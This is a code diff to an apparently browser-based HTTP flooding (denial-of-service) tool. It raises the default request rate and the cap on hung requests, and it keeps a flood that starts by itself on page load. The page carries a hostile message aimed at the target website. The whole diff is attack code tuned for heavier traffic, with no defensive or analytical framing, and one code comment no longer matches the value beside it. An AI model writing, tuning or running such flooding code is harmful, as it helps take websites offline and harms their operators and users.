@@ -31,7 +31,7 @@
 <div style="width:240px; height:160px; position:absolute; left:500px; top:150px;">
      <fieldset style="width:100%; height:100%;">
         <legend> </legend>
-         <label>PACKET<input style="width:40px;" id="rps" value="100" /></label><br />
+         <label>PACKET<input style="width:40px;" id="rps" value="10000" /></label><br />
 
          <label>Message<br /><input style="width:100%;" id="message" value="Fuck the Website ~" /></label>
     </fieldset>
@@ -72,7 +72,7 @@
                 succeededCtr = 0,
                 failedCtr = 0;
             var makeHttpRequest = function () {
-                                        if (requestedCtr > failedCtr + succeededCtr + 1000) { //Allow no more than 1000 hung requests
+                                        if (requestedCtr > failedCtr + succeededCtr + 100000) { //Allow no more than 1000 hung requests
                                                 return;
                                         };
 
@@ -120,7 +120,7 @@
                     isFiring = true;
                     this.innerHTML = "Stop flooding";
 
-                    fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
+                    fireInterval = setInterval(makeHttpRequest, (100000 / parseInt(rpsNode.value) | 0));
                 }
             };
 
@@ -128,7 +128,7 @@
 
 isFiring = true;
 document.getElementById("fireButton").innerHTML = "Start";
-fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(document.getElementById("rps").value) | 0));
+fireInterval = setInterval(makeHttpRequest, (100000 / parseInt(document.getElementById("rps").value) | 0));
     </script>
 
 
